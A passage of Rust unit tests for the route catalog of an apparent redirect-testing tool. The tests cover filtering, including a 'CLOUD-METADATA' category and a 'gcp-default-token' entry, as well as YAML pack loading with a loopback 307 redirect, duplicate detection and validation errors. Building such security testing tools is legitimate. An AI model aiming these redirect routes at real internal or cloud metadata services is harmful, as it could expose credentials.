    fn filters_are_conjunctive_and_case_insensitive() {
        let catalog = Catalog::builtin(&Config::default()).unwrap();
        let results = catalog.filter(&CatalogFilter {
            query: Some("TOKEN".to_owned()),
            category: Some("CLOUD-METADATA".to_owned()),
            tags: vec!["GCP".to_owned()],
        });
        assert_eq!(results.len(), 1);
        assert_eq!(results[0].id, "gcp-default-token");
    }

    #[test]
    fn external_pack_is_strict_and_duplicate_safe() {
        let temp = std::env::temp_dir().join(format!(
            "waybend-catalog-{}-{}",
            std::process::id(),
            SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));
        fs::create_dir_all(&temp).unwrap();
        let pack_path = temp.join("custom.yaml");
        fs::write(
            &pack_path,
            r#"
name: example
version: "1"
routes:
  - id: custom-loopback
    title: Custom loopback
    category: custom
    tags: [custom, local]
    target: http://127.0.0.1/custom
    status: 307
    hops: 2
"#,
        )
        .unwrap();
        let mut catalog = Catalog::builtin(&Config::default()).unwrap();
        catalog
            .merge_pack_file(&pack_path, &CatalogConfig::default())
            .unwrap();
        let entry = catalog.get("custom-loopback").unwrap();
        assert_eq!(entry.source, "pack:example@1");
        assert_eq!(entry.status, 307);
        assert!(
            matches!(catalog.merge_pack_file(&pack_path, &CatalogConfig::default()), Err(CatalogError::DuplicateId(id)) if id == "custom-loopback")
        );
        fs::remove_dir_all(temp).unwrap();
    }

    #[test]
    fn invalid_routes_and_unknown_pack_keys_fail() {
        let route = RouteDefinition {
            id: "Bad ID".to_owned(),
            title: "Bad".to_owned(),
            category: "test".to_owned(),
            description: String::new(),
            tags: vec![],
            target: "http://localhost".to_owned(),
            status: 302,
            hops: 1,
            headers: BTreeMap::new(),
            enabled: true,
        };
        assert!(matches!(
            validate_route(&route, 10),
            Err(CatalogError::InvalidRoute { .. })
        ));

        let result: Result<PackDefinition, _> =
            serde_yaml::from_str("name: x\nversion: '1'\nroutes: []\nextra: true\n");
        assert!(
            result
                .unwrap_err()
                .to_string()
                .contains("unknown field `extra`")
        );

        let mut bad_template = route;
        bad_template.id = "bad-template".into();
        bad_template.target = "http://{{unknown}}/".into();
        let error = validate_route(&bad_template, 10).unwrap_err();
        assert!(error.to_string().contains("unknown template variable"));
    }
}
